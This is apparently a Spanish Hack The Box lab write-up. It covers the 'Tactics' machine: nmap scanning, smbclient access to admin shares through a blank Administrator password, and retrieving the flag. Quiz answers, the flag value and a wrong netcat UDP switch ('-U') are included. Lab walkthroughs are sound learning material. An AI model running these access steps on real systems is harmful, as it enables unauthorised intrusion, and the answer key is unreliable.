6. *What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?* (¿Cual sería el valor de la variable "String cmd" si la máquina objetivo fuese un SO Windows?)

    cmd.exe

7. *What is a different command than "ip a" we could use to display our network interfaces' information on Linux?* (¿Cuál es un comando diferente a "ip a" que nos permite ver la información de nuestras interfaces de red en Linux?)

    ifconfig

8. *What switch should we use with netcat for it to use UDP transport mode?* (¿Qué "switch" debemos usar en netcat para usar el protocolo de transporte UDP?)

    -U

9. *What is the term used to describe making a target host initiate a connection back to the attacker host?* (¿Cuál es el término usado para describir el iniciar una conexión desde la máquina objetivo a nuestra máquina de atacante?)

    Reverse shell (Shell inversa)

## MÁQUINA TACTICS

### Enumeración de servicios y recopilación de información sensible

Como siempre, empiezo escaneando todo el rango de puertos TCP con `Nmap`.

```
# nmap -p- -T5 -vv 10.129.103.4

Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

Tras este primer escaneo, veo que se encuentran abiertos los puertos 135, 139 y 445, correspondiente a RPC, NetBIOS y SMB, respectivamente. Con esta información, realizo un segundo escaneo empleando las flags -sC y -sV para intentar obtener más información acerca del servicio que se están ejecutando en los puertos abiertos.

```
# nmap -p135,139,445 -sCV 10.129.103.4

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Tras realizar los correspondientes escaneos, comienzo indagando por el servicio SMB utilizando la herramienta `smbclient`. Lo primero que intento es acceder a los recursos compartidos mediante una sesión nula, es decir, sin proporcionar usuario ni contraseña. Al no permitirme el acceso, pruebo, como en una de las anteriores máquinas, a acceder como Administrador sin proporcionar contraseña, consiguiendo así acceder y listar todos los recursos:

```
# smbclient -N -L //10.129.103.4                
session setup failed: NT_STATUS_ACCESS_DENIED

# smbclient -U "Administrator" -L //10.129.103.4
Enter WORKGROUP\Administrator's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.103.4 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Como se puede ver, los 3 recursos son recursos administrativos que se encuentran por defecto en el sistema (esto lo sabemos por el carácter "$" al final del nombre). Pero, al estar logado como administrador, quizá podamos acceder al recurso "C$", que debería contener todo el sistema de archivos del objetivo.

![Contenido del recurso compartido "C$"](/assets/img/HTB/Tactics/Clisting.png)

Normalmente, la flag suele encontrarse en el directorio personal de los usuarios o, en su defecto, en el escritorio.

```
smb: \> cd Users\Administrator\
smb: \Users\Administrator\> ls                                                                                                                                                                                                               
  .                                   D        0  Wed Apr 21 11:23:32 2021                                                                                                                                                                   
  ..                                  D        0  Wed Apr 21 11:23:32 2021                                                                                                                                                                   
  3D Objects                         DR        0  Wed Apr 21 11:23:31 2021
  AppData                            DH        0  Wed Apr 21 11:23:19 2021
  Application Data                DHSrn        0  Wed Apr 21 11:23:19 2021
  Contacts                           DR        0  Wed Apr 21 11:23:31 2021
  Cookies                         DHSrn        0  Wed Apr 21 11:23:19 2021
  Desktop                            DR        0  Thu Apr 22 03:16:03 2021
  Documents                          DR        0  Wed Apr 21 11:23:32 2021
  Downloads                          DR        0  Wed Jul  7 13:44:36 2021
  Favorites                          DR        0  Wed Apr 21 11:23:31 2021
  Links                              DR        0  Wed Apr 21 11:23:32 2021
  Local Settings                  DHSrn        0  Wed Apr 21 11:23:19 2021
  Music                              DR        0  Wed Apr 21 11:23:32 2021
  My Documents                    DHSrn        0  Wed Apr 21 11:23:19 2021
  NetHood                         DHSrn        0  Wed Apr 21 11:23:19 2021
  NTUSER.DAT                        AHn   786432  Mon Sep 27 06:38:14 2021
  ntuser.dat.LOG1                   AHS   238592  Wed Apr 21 11:23:18 2021
  ntuser.dat.LOG2                   AHS    12288  Wed Apr 21 11:23:18 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf    AHS    65536  Wed Apr 21 05:03:39 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Wed Apr 21 11:23:19 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Wed Apr 21 11:23:19 2021
  ntuser.ini                         HS       20  Wed Apr 21 11:23:19 2021
  Pictures                           DR        0  Wed Apr 21 11:23:31 2021
  PrintHood                       DHSrn        0  Wed Apr 21 11:23:19 2021
  Recent                          DHSrn        0  Wed Apr 21 11:23:19 2021
  Saved Games                        DR        0  Wed Apr 21 11:23:32 2021
  Searches                           DR        0  Wed Apr 21 11:23:32 2021
  SendTo                          DHSrn        0  Wed Apr 21 11:23:19 2021
  Start Menu                      DHSrn        0  Wed Apr 21 11:23:19 2021
  Templates                       DHSrn        0  Wed Apr 21 11:23:19 2021
  Videos                             DR        0  Wed Apr 21 11:23:31 2021

                3774463 blocks of size 4096. 1157300 blocks available
smb: \Users\Administrator\> cd Desktop\
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Thu Apr 22 03:16:03 2021
  ..                                 DR        0  Thu Apr 22 03:16:03 2021
  desktop.ini                       AHS      282  Wed Apr 21 11:23:32 2021
  flag.txt                            A       32  Fri Apr 23 05:39:00 2021

                3774463 blocks of size 4096. 1157300 blocks available
```

Como se puede observar, encuentro la flag en el escritorio del usuario Administrator. Por tanto, procedo a descargarla y visualizarla en mi máquina:

```
smb: \Users\Administrator\Desktop\> get flag.txt
getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
smb: \Users\Administrator\Desktop\> exit


# cat flag.txt
f751c19eda8f61ce81827e6930a1f40c
```

### Cuestionario

1. *Which Nmap switch can we use to enumerate machines when our packets are otherwise blocked by the Windows firewall?* (¿Qué "switch" de Nmap podemos usar para enumerar máquinas cuando nuestros paquetes son bloqueados por el firewall de Windows?)

    -Pn

2. *What does the 3-letter acronym SMB stand for?* (¿Qué significa el acrónimo de 3 letras SMB?)

    Server Message Block

3. *What port does SMB use to operate at?* (¿Qué puerto utiliza SMB para operar?)

    445

4. *What command line argument do you give to "smbclient" to list available shares?* (¿Qué argumento de línea de comandos hace que "smbclient" liste los recursos compartidos disponibles?)

    -L

5. *What character at the end of a share name indicates it's an administrative share?* (¿Qué carácter al final del nombre del recurso compartido nos indica que es un recurso administrativo del sistema?)

    $

6. *Which Administrative share is accessible on the box that allows users to view the whole file system?* (¿Qué recurso administrativo es accesible en la máquina y permite a los usuarios visualizar todo el sistema de archivos?)

    C$

7. *What command can we use to download the files we find on the SMB Share?* (¿Qué comando podemos utilizar para descargar los archivos que encontramos en el recurso compartido por SMB?)

    get

8. *Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?* (¿Qué herramiente perteneciente a la colección de Impacket puede ser usada para conseguir una shell interactiva en el sistema?)

    psexec.py
